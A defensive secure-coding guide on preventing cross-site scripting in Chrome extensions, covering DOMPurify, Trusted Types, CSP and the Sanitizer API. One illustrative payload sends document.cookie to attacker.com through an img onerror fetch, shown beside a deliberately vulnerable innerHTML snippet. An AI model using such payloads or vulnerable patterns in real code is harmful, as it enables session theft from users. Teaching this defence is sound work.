---
layout: default
title: "Prevent XSS in Chrome Extensions: Input Sanitization and Secure DOM Manipulation"
description: "Master XSS prevention in Chrome extensions with DOMPurify, Trusted Types, Sanitizer API, message passing security, and CSP. Protect against injection attacks."
canonical_url: "https://theluckystrike.github.io/chrome-extension-guide/guides/chrome-extension-xss-prevention-input-sanitization/"
---

# Prevent XSS in Chrome Extensions: Input Sanitization and Secure DOM Manipulation

Cross-site scripting (XSS) represents one of the most critical security vulnerabilities affecting Chrome extensions. Unlike traditional web applications, extensions operate with elevated privileges and access to sensitive APIs, making XSS flaws potentially devastating. A successful XSS attack in an extension can compromise user credentials, exfiltrate browsing data, manipulate page content, and even execute actions on behalf of the user. This comprehensive guide covers every aspect of XSS prevention in Chrome extensions, from understanding extension-specific attack vectors to implementing robust sanitization mechanisms that protect your users and your reputation.

Chrome extensions face unique XSS challenges that distinguish them from conventional web applications. The extension ecosystem introduces multiple attack surfaces including content scripts that interact directly with web pages, background service workers that manage complex logic, popup pages that provide user interfaces, options pages for configuration, and message passing systems that facilitate communication between these components. Each of these contexts presents distinct vulnerabilities that require tailored security approaches. Understanding these nuances is essential for building secure extensions that can withstand sophisticated attacks.

## Understanding Extension-Specific XSS Vectors

Extension XSS vulnerabilities arise from several unique vectors that don't exist in traditional web applications. Content scripts represent the most exposed attack surface because they execute within the context of web pages that extension users visit. While content scripts operate in an isolated world separate from the page's JavaScript, they still have access to the DOM and can be exploited through various injection techniques. When content scripts use `innerHTML`, `outerHTML`, or similar APIs to render content containing user input or data from external sources, they create direct pathways for attackers to inject malicious scripts.

The message passing system between extension components introduces another significant attack vector. Background scripts, content scripts, popup pages, and options pages communicate through Chrome's message passing APIs. If these messages contain unsanitized data that gets rendered or executed somewhere in the chain, attackers can potentially inject malicious content. This is particularly dangerous when content scripts forward data from web pages to background scripts or when popup pages display data received through message passing without proper validation.

Extension options pages and popup pages often display data from multiple sources including user configuration, external APIs, and content scripts. When these pages use template rendering or DOM manipulation methods that don't properly escape content, they become vulnerable to stored XSS attacks. An attacker who can influence any data source that the extension displays creates a pathway for injecting scripts that execute whenever the user opens the popup or options page.

Perhaps most critically, extensions can be vulnerable to what researchers call "Universal XSS" - vulnerabilities that exploit the extension's privileged position to attack any web page regardless of the site's own security measures. A content script with XSS vulnerabilities can allow attackers to access sensitive data from any page the user visits, not just pages controlled by the attacker. This elevated privilege makes extension XSS particularly severe and underscores the importance of rigorous sanitization throughout the extension codebase.

## The Dangers of innerHTML and Unsafe DOM Manipulation

The `innerHTML` property represents the most common source of XSS vulnerabilities in Chrome extensions. When developers use `innerHTML` to set HTML content that includes any user-generated data or data from external sources, they effectively allow that content to contain script tags, event handlers, and other executable elements. The fundamental problem with `innerHTML` is that it parses the assigned string as HTML, creating actual DOM elements rather than escaped text. Any script tags within the assigned content execute automatically, giving attackers a direct path to code execution.

Consider a common pattern where a content script displays information about the current page:

```javascript
// DANGEROUS: Never use innerHTML with untrusted content
function displayPageInfo(data) {
  const infoDiv = document.getElementById('info');
  infoDiv.innerHTML = `<p>Title: ${data.title}</p><p>URL: ${data.url}</p>`;
}
```

If an attacker controls the `data.title` or `data.url` values, they can easily inject malicious scripts:

```javascript
// Attacker's payload
{ title: '<img src=x onerror="fetch(\'https://attacker.com/steal?cookie=\'+document.cookie)">'}
```

This payload triggers an error event on the broken image tag, executing the attacker's JavaScript code in the context of your extension. The same vulnerability exists with `outerHTML`, `insertAdjacentHTML`, and any other DOM manipulation method that parses HTML.

Modern JavaScript offers safer alternatives that should replace unsafe HTML assignment throughout your extension code. The `textContent` property sets text without parsing HTML, making it impossible for injected content to execute. Similarly, `innerText` provides text assignment with consideration for styling and rendering. For cases where HTML rendering is genuinely necessary, you must employ proper sanitization before assignment.

## DOMPurify Integration for Robust Sanitization

DOMPurify is the gold standard for sanitizing HTML content in JavaScript applications, and it works excellently within Chrome extensions. This library parses HTML, removes dangerous elements and attributes while preserving safe formatting, and returns clean HTML that can be safely inserted into the DOM. Integrating DOMPurify into your extension provides defense-in-depth protection against XSS attacks through a well-tested, actively maintained solution.

Installing DOMPurify in your extension requires adding the library to your project:

```bash
npm install dompurify
```

After installation, you can import and use DOMPurify throughout your extension:

```javascript
import DOMPurify from 'dompurify';

// Safe HTML rendering with DOMPurify
function displayPageInfo(data) {
  const infoDiv = document.getElementById('info');
  
  // Configure DOMPurify for extension context
  const clean = DOMPurify.sanitize(data.content, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href', 'class'],
    ALLOW_DATA_ATTR: false
  });
  
  infoDiv.innerHTML = clean;
}
```

DOMPurify's configuration options allow you to fine-tune which tags and attributes your application permits. The example above restricts content to basic formatting elements and links, preventing potentially dangerous elements like `<script>`, `<iframe>`, or event handlers. For extension popup and options pages that need richer formatting, you might allow additional tags while carefully reviewing each addition for potential security implications.

When using DOMPurify in content scripts, you need to handle the fact that content scripts run in an isolated world. The recommended approach is to bundle DOMPurify with your extension or load it from a trusted source within your extension. Loading DOMPurify from external CDNs in content scripts creates dependencies on external resources and potentially exposes users to supply chain attacks. By including DOMPurify directly in your extension package, you ensure consistent behavior and eliminate external attack vectors.

## Trusted Types API for Prevention at Scale

The Trusted Types API represents a modern browser security feature that prevents DOM XSS by requiring developers to use special "trusted" type objects instead of strings when assigning potentially dangerous content. Chrome supports this API, and using it in your extension provides architectural protection against entire categories of XSS vulnerabilities. When Trusted Types are enforced, the browser simply refuses to accept string assignments to sinks like `innerHTML`, preventing entire classes of bugs from becoming security issues.

Implementing Trusted Types requires defining policies that produce trusted objects:

```javascript
// Create a Trusted Types policy
const policy = trustedTypes.createPolicy('extensionPolicy', {
  createHTML: (input) => {
    // Sanitize using DOMPurify before creating trusted HTML
    return DOMPurify.sanitize(input, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'ol', 'li'],
      ALLOWED_ATTR: ['href']
    });
  }
});

// Safe assignment using Trusted Types
function displayContent(content) {
  const container = document.getElementById('content');
  container.innerHTML = policy.createHTML(content); // Works!
  // container.innerHTML = content; // Would throw error with Trusted Types
}
```

To fully enforce Trusted Types, add a Content-Security-Policy header with the trusted-types directive:

```json
{
  "content_security_policy": {
    "extension_pages": "script-src 'self'; object-src 'self'; trusted-types extensionPolicy"
  }
}
```

This CSP directive tells the browser to only allow Trusted Types from your defined policy. Any attempt to use string-based innerHTML assignments will fail, preventing accidental XSS vulnerabilities at the application level. While Trusted Types require more initial setup than simple string assignment, they provide fundamental protection that scales across large codebases.

## Message Passing Sanitization

Chrome extension message passing creates data flows between different extension contexts that require careful sanitization. Content scripts often collect data from web pages and send it to background scripts for processing, and background scripts may send data back to popup pages for display. Each transition point represents an opportunity for sanitization, and the key principle is to sanitize data at the boundary where it enters a new trust context.

When content scripts receive messages from background scripts or vice versa, the received data should be treated as untrusted regardless of its apparent source. The background script might have been compromised, or the message might have been injected through a messaging vulnerability. Always validate and sanitize data received through message passing before using it in any DOM operations or passing it to sensitive APIs.

```javascript
// Content script receiving messages
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === 'displayData') {
    // Always sanitize data received through message passing
    const sanitized = DOMPurify.sanitize(message.data.content, {
      ALLOWED_TAGS: ['b', 'i', 'strong', 'em', 'a', 'p'],
      ALLOWED_ATTR: ['href']
    });
    
    // Now safe to render
    document.getElementById('display').innerHTML = sanitized;
  }
});
```

For background scripts that aggregate data from multiple content scripts, implement input validation at the receiving end. Verify that messages conform to expected formats, validate data types, and enforce length limits. This prevents malformed or malicious messages from causing security issues downstream.

## Content Script Injection Risks

Content scripts operate in a uniquely exposed position because they interact with web pages that may contain malicious content. Web pages can exploit the presence of content scripts to attack the extension and its users through various techniques. Understanding these attack vectors is essential for building secure content scripts that properly isolate extension logic from page content.

One significant risk involves web pages detecting content script presence and injecting content specifically designed to exploit extension vulnerabilities. If your content script reads data from the page DOM and uses it without sanitization, attackers can craft pages that set malicious attribute values, text content, or event handlers that your script later incorporates into extension UI.

Always treat data extracted from the page DOM as untrusted:

```javascript
// Extract data from page
const pageTitle = document.title;
const metaDescription = document.querySelector('meta[name="description"]')?.content;

// Sanitize before using in extension context
const cleanTitle = DOMPurify.sanitize(pageTitle);
const cleanDesc = DOMPurify.sanitize(metaDescription || '');
```

Additionally, content scripts should avoid using data from `document.cookie`, `localStorage`, or `sessionStorage` on web pages without sanitization. While these storage mechanisms are page-specific, malicious pages can set cookie values or storage content specifically designed to exploit extension vulnerabilities.

## Popup and Options Page Security

Popup pages and options pages deserve particular attention because they often display data from various sources and may be visible to users frequently during normal extension use. These pages typically render HTML using template systems or direct DOM manipulation, and any unsanitized data displayed in these contexts creates immediate XSS risks.

Implement consistent sanitization for all data displayed in popup and options pages:

```javascript
// In popup.js - sanitize all displayed data
document.addEventListener('DOMContentLoaded', () => {
  // Load and sanitize user preferences
  chrome.storage.local.get(['username', 'customMessage'], (result) => {
    const nameEl = document.getElementById('username');
    const msgEl = document.getElementById('message');
    
    // Always sanitize storage data
    nameEl.textContent = DOMPurify.sanitize(result.username || 'Guest');
    msgEl.textContent = DOMPurify.sanitize(result.customMessage || '');
  });
});
```

Options pages that allow users to configure extension behavior should validate all input before storing it. While the user presumably has good intentions, storing unsanitized configuration creates risks when that data gets displayed elsewhere or processed by other extension components.

## CSP as a Defense Layer

Content Security Policy provides a critical defense-in-depth layer for Chrome extensions. While proper sanitization addresses most XSS risks, CSP serves as the last line of defense when sanitization fails or is overlooked. Configuring strong CSP headers limits the damage from any remaining vulnerabilities and prevents entire classes of attacks.

For comprehensive CSP configuration in your extension, see our [Chrome Extension Content Security Policy guide](/chrome-extension-guide/guides/chrome-extension-content-security-policy/) and the [Security Hardening guide](/chrome-extension-guide/guides/security-hardening/). These resources provide detailed configuration examples for Manifest V3 extensions.

A robust CSP for extension pages should include:

```json
{
  "content_security_policy": {
    "extension_pages": "script-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self' https://api.yourservice.com; base-uri 'self'; form-action 'self'"
  }
}
```

This configuration restricts script sources to only the extension's own files, prevents object elements entirely, limits connections to your legitimate API endpoints, and prevents base URL manipulation. While `'unsafe-inline'` for styles provides convenience, consider using CSS modules or external stylesheets to eliminate this relaxation entirely.

## The Sanitizer API: Modern Alternative

The Sanitizer API represents the future of HTML sanitization in browsers and provides a native, built-in alternative to DOMPurify. This API is designed to be more performant and to integrate more naturally with browser security features. While browser support is still expanding, Chrome supports the Sanitizer API and it's worth considering for new projects.

```javascript
// Using the native Sanitizer API
const sanitizer = new Sanitizer({
  allowedTags: ['b', 'i', 'em', 'strong', 'a', 'p'],
  allowedAttributes: { 'a': ['href'] }
});

function sanitizeAndSet(elementId, htmlString) {
  const element = document.getElementById(elementId);
  element.setHTML(htmlString, sanitizer); // Uses Sanitizer API
}
```

The `setHTML` method provides a direct, safe alternative to `innerHTML` that parses content through the configured sanitizer. As browser support improves and the API stabilizes, the Sanitizer API will likely become the preferred approach for new extensions. However, DOMPurify remains the most broadly compatible and well-tested option for production extensions today.

## Automated Security Scanning

Implementing automated security scanning helps catch XSS vulnerabilities before they reach production. Several tools can analyze your extension code for common vulnerability patterns and potential security issues.

Linters and static analysis tools can detect dangerous patterns:

```bash
# ESLint with security plugins
npm install --save-dev eslint-plugin-security

# Configure in .eslintrc
{
  "plugins": ["security"],
  "rules": {
    "security/detect-unsafe-regex": "error",
    "security/detect-possible-timing-attacks": "error",
    "security/detect-buffer-noassert": "error"
  }
}
```

For comprehensive extension security testing, consider integrating tools that specifically analyze Chrome extension security patterns. The [Extension Security Audit](/chrome-extension-guide/guides/extension-security-audit/) guide provides detailed procedures for manually and automatically auditing extension security.

OWASP provides valuable resources for understanding and preventing XSS vulnerabilities in web applications and, by extension, Chrome extensions. The [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) provides comprehensive guidance that applies directly to extension development. Additionally, OWASP's [Chrome Extension Security](https://owasp.org/www-project-web-security-testing-guide/) resources specifically address extension-specific attack vectors.

## Conclusion

XSS prevention in Chrome extensions requires a multi-layered approach combining secure coding practices, proper sanitization, modern browser APIs, and defense-in-depth through CSP. The unique attack surfaces introduced by extension architecture—content scripts, message passing, popup and options pages—demand vigilance throughout the development process. By implementing DOMPurify for HTML sanitization, adopting Trusted Types where possible, securing message passing boundaries, and configuring robust CSP headers, you can build extensions that protect users from XSS attacks. Remember that security is an ongoing process: regularly audit your code, stay updated on emerging threats, and leverage automated tools to catch vulnerabilities early.

---

*Part of the Chrome Extension Guide by theluckystrike. More at zovo.one.*
